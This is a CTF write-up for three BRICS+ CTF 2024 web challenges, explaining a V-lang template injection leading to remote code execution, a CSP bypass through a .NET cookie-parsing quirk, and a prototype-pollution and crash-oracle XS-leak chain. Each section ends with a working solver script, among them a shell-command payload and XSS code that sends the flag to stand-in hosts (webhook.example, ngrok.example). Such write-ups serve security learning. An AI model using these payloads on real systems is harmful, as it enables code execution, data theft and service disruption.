+++
title = 'BRICS+ CTF 2024 — villa & mirage & excess'
date = 2024-09-13T00:00:00+03:00
tags = ['ctf', 'writeup', 'web']
toc = true
+++

## villa

The service is written in [vlang](https://vlang.io/). 

### Files

**main.v**:

```v
module main

import os
import vweb

struct App {
	vweb.Context
}

@['/'; get; post]
fn (mut app App) index() vweb.Result {
	return $vweb.html()
}

@['/villa'; get; post]
fn (mut app App) villa() vweb.Result {
	if app.req.method == .post {
		os.write_file('villa.html', $tmpl('template.html')) or { panic(err) }
	}

	return $vweb.html()
}

fn main() {
	app := &App{}
	params := vweb.RunParams{
		port: 8080,
		nr_workers: 1,
    }

	vweb.run_at(app, params) or { panic(err) }
}
```

**template.html**:

```html
<h1>current owner: 🏆 <span>@app.req.data</span> 🏆 </h1>
<pre>
                 ._____________________________.
                ///(///(///(///(///(///(///(////\
               ///(///(///(///(///(///(///(///(  \
              ///(///(///(///(///(///(///(///(   |
             ///(///(///(///(///(///(///(///(  . |
             |  ___    ___    ___   _____  | .'| |
             | |_|_|  |_|_|  |_|_| |__|__| | |.' |
             | |_|_|  |_|_|  |_|_| |__|__| | ' . ||'--:|
             |    __   _____    _ %%%____  | .'| |  .|
             |   |  | |__|__|  |_%%%%%___| ||.' .'.|   .' 
             |   | .| |__|__|  |%%%:%%___| |' .'.|   .'  
             |___|__|___________%%::%______|.'.|   .'  
           .|   '-=-.'            :'       .|    .'  
         .|   '   .               :      .|    .'  
       .|   '   .                       .|   .'  
      |'--'|==||'--'|'--'|'--'|'--'|'-'|   .'  
      =jim================================'  
</pre>
```

### Solution

The handler `GET /villa` reads a template from `villa.html` and renders it using `$vweb.html()`.

There is a SSTI (server-side template injection) in `POST /villa`. The attacker could write the payload in `owner` field, it will be inserted in the file `villa.html` without any sanitization.

The intended solution requires reading the standard library's template engine. The source code is here: [vlib/v/parser/tmpl.v](https://github.com/vlang/v/blob/master/vlib/v/parser/tmpl.v). The engine translates the template into a vlang code and compiles it, therefore there is an RCE vulnerability.

For example the attacker could exploit CSS matcher:

[vlib/v/parser/tmpl.v#L397](https://github.com/vlang/v/blob/715dc3116123b69abe25d14536cad18da6bd7ab6/vlib/v/parser/tmpl.v#L397)

```v
} else if line_t.starts_with('.') && line.ends_with('{') {
    // `.header {` => `<div class='header'>`
    class := line.find_between('.', '{').trim_space()
    trimmed := line.trim_space()
    source.write_string(strings.repeat(`\t`, line.len - trimmed.len)) // add the necessary indent to keep <div><div><div> code clean
    source.writeln('<div class="${class}">')
    continue
}
```

A line between `'.'` and `'{'` is inserted into the template's code without any modification. The simplest way is using `C.system()` function which runs a shell command in a separate process.

Example solver:

```python
#!/usr/bin/env python3

import sys
import time
import requests

HOST = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 17171

URL = f'http://{HOST}:{PORT}/villa'

while True:
    try:
        payload = "\n. '); C.system('cat flag.*.txt > villa.html'.str); println(' {\n"
        requests.post(URL, data = payload)

        response = requests.get(URL)
        print(response.content)

        if b'brics+' in response.content:
            break
    except Exception as e:
        print(e)

    time.sleep(2)
```

## mirage

The source code is available here: [https://github.com/C4T-BuT-S4D/bricsctf-2024-quals/tree/master/tasks/web/medium-mirage/deploy/mirage](https://github.com/C4T-BuT-S4D/bricsctf-2024-quals/tree/master/tasks/web/medium-mirage/deploy/mirage).

### Solution

We need to escape CSP restrictions and get the flag from `/flag`. CSP is set only if the cookie `session` is present.

```csharp
if (ctx.GetCookie("session") != null) {
    ctx.SetHeader(
        "Cross-Origin-Resource-Policy", "same-origin"
    );
    ctx.SetHeader(
        "Content-Security-Policy", (
            "sandbox allow-scripts allow-same-origin; " +
            "base-uri 'none'; " +
            "default-src 'none'; " +
            "form-action 'none'; " +
            "frame-ancestors 'none'; " +
            "script-src 'unsafe-inline'; "
        )
    );
}
```

So here is another way: just remove the `session` cookie. But we can't remove it directly using `document.cookie` because `session` is HttpOnly.

The indended solution exploits the bug in `System.Net` cookie parsing:

[System/net/System/Net/cookie.cs#L1033](https://github.com/microsoft/referencesource/blob/51cf7850defa8a17d815b4700b67116e3fa283c2/System/net/System/Net/cookie.cs#L1033):

```csharp
internal CookieToken FindNext(bool ignoreComma, bool ignoreEquals) {
    m_tokenLength = 0;
    m_start = m_index;
    while ((m_index < m_length) && Char.IsWhiteSpace(m_tokenStream[m_index])) {
        ++m_index;
        ++m_start;
    }

    CookieToken token = CookieToken.End;
    int increment = 1;

    if (!Eof) {
        if (m_tokenStream[m_index] == '"') {
            Quoted = true;
            ++m_index;
            bool quoteOn = false;
            while (m_index < m_length) {
                char currChar = m_tokenStream[m_index];
                if (!quoteOn && currChar == '"')
                    break;
                if (quoteOn)
                    quoteOn = false;
                else if (currChar == '\\')
                    quoteOn = true;
                ++m_index;
            }
```

So if the cookie starts with `"` the parser interprets it as a double-quoted cookie. This way of parsing contradicts RFC, so we can exploit it.

Suppose the `Cookie` header looks like this: `a="beb; session=admin; b=ra"`. There are actually 3 different cookies:

```
{
    'a': '"beb',
    'session': 'admin',
    'b': 'ra"'
}
```

But the server would parse this as

```
{
    'a': 'a="beb; session=admin; b=ra"'
}
```

So the `session` cookie is inserted inside the `a` cookie. In order to place our cookie before `session` we need to set `Path=/xss` because chrome sorts cookies by path values.

Example solver:

```python
#!/usr/bin/env python3

def escape(html: str) -> str:
    return ''.join('%' + hex(ord(x))[2:].zfill(2) for x in html)

url = 'http://localhost:8989'
report = 'http://webhook.example/report'

step2 = f'''
<script>
    fetch('/flag')
        .then(x => x.text())
        .then(x => fetch('{report}?flag=' + encodeURIComponent(x)));
</script>
'''

step1 = f'''
<script>
    document.cookie = 'x="ss; Path=/xss';
    location.href = '/xss?xss={escape(step2)}';
</script>
'''

print(f'{url}/xss?xss={escape(step1)}')
```

## excess

The source code is available here: [https://github.com/C4T-BuT-S4D/bricsctf-2024-quals/tree/master/tasks/web/hard-excess/src](https://github.com/C4T-BuT-S4D/bricsctf-2024-quals/tree/master/tasks/web/hard-excess/src).

Let's describe some milestones.

### Client

Client-side problems are straightforward:

#### 1. prototype pollution

There is obvious prototype pollution in `Context.ContextProvider`:

[Context/index.tsx](https://github.com/C4T-BuT-S4D/bricsctf-2024-quals/blob/master/tasks/web/hard-excess/src/client/src/Context/index.tsx)

```ts
const context: any = { name, setName };
const previous: string = decodeURIComponent(window.location.hash.slice(1));

JSON.parse(previous || "[]").map(([x, y, z]: any[]) => context[x][y] = z);
```

So we can control `location.hash` value and arbitrary pollute object.

#### 2. HTML insertion

`ViewMessage` page downloads html from the server and inserts it using `dangerouslySetInnerHTML`.

[components/pages/ViewMessagePage/index.tsx](https://github.com/C4T-BuT-S4D/bricsctf-2024-quals/blob/master/tasks/web/hard-excess/src/client/src/components/pages/ViewMessagePage/index.tsx)

```
return (
    <div className='ViewMessagePage'>
        <div className='ViewMessagePage-Header'>
            <span className='ViewMessagePage-Title'>Excess | Message</span>
        </div>
        <div className='ViewMessagePage-Container'>
            <Error error={error}/>
            <div className='ViewMessagePage-Message' dangerouslySetInnerHTML={{__html: html}}></div>
            <div className='ViewMessagePage-Buttons'>
                <Button onClick={backClickHandler} id='back' text='Back'/>
            </div>
        </div>
    </div>
);
```

### Server

The server handles API exceptions using custom exception handler.

[server/api.cpp](https://github.com/C4T-BuT-S4D/bricsctf-2024-quals/blob/master/tasks/web/hard-excess/src/server/server/api.cpp):

```cpp
void Api::HandleException(const httplib::Request& req, httplib::Response& res, const std::exception_ptr ptr) {
    std::string error;

    try {
        std::rethrow_exception(ptr);
    } catch (const BadRequestError& ex) {
        error = ex.what();
        res.status = httplib::StatusCode::BadRequest_400;
    } catch (const Storage::MessageAlreadyExistsError& ex) {
        error = ex.what();
        res.status = httplib::StatusCode::Conflict_409;
    } catch (const Services::InvalidSessionError& ex) {
        error = ex.what();
        res.status = httplib::StatusCode::Unauthorized_401;
    } catch (const Services::InvalidCredentialsError& ex) {
        error = ex.what();
        res.status = httplib::StatusCode::Unauthorized_401;
    } catch (const Services::MessageNotFoundError& ex) {
        error = ex.what();
        res.status = httplib::StatusCode::NotFound_404;
    } catch (const std::exception& ex) {
        error = ex.what();
    }

    nlohmann::json result = {
        {"error", error},
    };

    res.set_content(result.dump(), JsonContentType);
}
```

But there are two problems:

#### 1. missing exception

During registration the server checks if the new author already exists.

[storage/sqlite_storage.cpp](https://github.com/C4T-BuT-S4D/bricsctf-2024-quals/blob/master/tasks/web/hard-excess/src/server/storage/sqlite_storage.cpp)

```cpp
void SqliteStorage::CreateAuthor(const Models::Author& author) {
    auto sql = "insert into authors (name, password) values (?, ?)"s;

    try {
        ExecuteSql(sql, { author.GetName(), author.GetPassword() });
    } catch (const SqliteConflictError&) {
        throw AuthorAlreadyExistsError("author " + author.GetName() + " already exists"s);
    }
}
```

But `AuthorAlreadyExistsError` has no `catch` clause for itself. Instead it will be proceed as `std::exception` default clause. Note that it doesn't set `res.status`, so it would be 200_OK.

#### 2. unhandled exception

What if another exception occured during handling the exception? Then function `Api::HandleException` will throw this exception and server will crash. Note that there is no check for JSON exceptions.

```cpp
nlohmann::json result = {
    {"error", error},
};

res.set_content(result.dump(), JsonContentType);
```

So if JSON will throw the exception the server will crash.

### Exploitation

1. Use prototype pollution to pollute `headers` and `method` fields of object. It leads to control `fetch()` parameters object and allows us to perform any request.

2. Use `Range: bytes=17-` header in order to download a part of returned JSON. Basically if the server set `res.status` it's not possible, but on `AuthorAlreadyExistsError` exception `res.status` is not set and range header will be applied

3. Use XS-leak to exfiltrate flag. CSP blocks inline javascript, so we can't use `<script>`, but we still can insert HTML. Use object with lazy loading fallback.

```html
<object data='URL'>
    <img src='FALLBACK_URL' loading='lazy'>
</object>
```

If call to `URL` returns error then `FALLBACK_URL` will be called. If `URL` returns 200 OK there won't be any call to `FALLBACK_URL`.

4. Throw unhandled exception if prefix is not correct. Set `URL` to `/messages?content=<prefix>` and `FALLBACK_URL` to `/message/%ff`. JSON will throw an exception during `\xff` serialization, it leads to server downtime.

5. Track server downtime from internet. We know public URL so we can easily perform many requests and check is the server down.

So the final chain:

```
1. pollute fetch headers
2. conflict on /register -> html inserted on the page
3. call to /messages?content=<prefix> with fallback to /message/%ff
4. check if the server is crashed
```

Example solver: 

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8"/>
        <title>exploit</title>
    </head>
    <body>
        <script>

const EXCESS_URL = 'http://excess.example:12345/';
const INTERNAL_EXCESS_URL = 'http://localhost:31337';

const REPORT_URL = 'http://ngrok.example:12345/report';

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const loadState = () => {
    const hash = location.hash.slice(1) || '{}';
    const state = JSON.parse(decodeURIComponent(hash));

    if (typeof state.prefix === 'undefined') {
        state.prefix = '{';
    }
    if (typeof state.index === 'undefined') {
        state.index = 0;
    }

    return state;
};

const saveState = (state) => {
    location.hash = encodeURIComponent(JSON.stringify(state));
    location.reload();
};

const report = value => {
    const data = encodeURIComponent(JSON.stringify(value));
    const url = `${REPORT_URL}?report=${data}`;

    return fetch(url, {
        method: 'GET',
        mode: 'no-cors',
    }).catch(() => { });
};

const register = credentials => {
    const url = `${EXCESS_URL}/api/register`;

    return fetch(url, {
        method: 'POST',
        body: credentials,
        mode: 'cors',
    }).then(x => true).catch(x => false);
};

const constructCredentials = prefix => {
    const random = Math.random().toString();

    const html = (
        `<object data='/api/messages?content=${prefix}'>` +
            `<img src='/api/message/${random}%ff' loading='lazy'>` +
        `</object>`
    );

    return `name=${html}&password=x`;
};

const constructPollution = credentials => {
    const pollution = [
        ['__proto__', 'headers', [['Range', 'bytes=17-']]],
        ['__proto__', 'method', 'POST'],
        ['__proto__', 'body', credentials],
    ];

    return JSON.stringify(pollution);
};

const livenessProbe = async results => {
    return fetch(EXCESS_URL, { method: 'HEAD', mode: 'cors', cache: 'no-store' })
            .then(_ => results.push('alive'))
            .catch(_ => results.push('dead'));
};

const startLivenessCheck = (ctx, timeout) => {
    ctx.probes = [];
    ctx.results = [];
    ctx.initialized = true;

    ctx.interval = setInterval(
        () => ctx.probes.push(livenessProbe(ctx.results)),
        timeout,
    );
};

const stopLivenessCheck = async ctx => {
    if (ctx.initialized !== true) {
        return;
    }

    clearInterval(ctx.inverval);
    await sleep(100);

    await Promise.all(ctx.probes);

    return ctx.results;
};

const testPrefix = async (wnd, prefix) => {
    const random = Math.random().toString();

    const credentials = constructCredentials(prefix);
    if (!(await register(credentials))) {
        return 'registration failed';
    }

    const pollution = constructPollution(credentials);
    
    const ctx = {};

    try {
        startLivenessCheck(ctx, 2);

        await sleep(100);

        const url = `${INTERNAL_EXCESS_URL}/message/${random}%2f..%2f..%2fregister#${encodeURIComponent(pollution)}`;
        wnd.location.href = url;

        await sleep(2000);
    } finally {
        await stopLivenessCheck(ctx);
    }

    if (ctx.results.some(result => result == 'dead')) {
        return false;
    }

    return true;
};

const main = async () => {
    const alphabet = '0123456789abcdef-}';

    const state = loadState();
    await report(state);

    const wnd = window.open();
    await sleep(1000);

    const symbol = alphabet[state.index];
    const new_prefix = state.prefix + symbol;

    let result = true;

    for (let i = 0; i < 5; i += 1) {
        if (!(await testPrefix(wnd, new_prefix))) {
            result = false;
            break;
        }
    }

    wnd.close();

    if (result) {
        state.prefix = new_prefix;
        state.index = 0;
    } else {
        state.index += 1;
    }

    saveState(state);
};

main()
    .catch(error => report({ error: error.toString(), stack: error.stack }));

        </script>
    </body>
</html>
```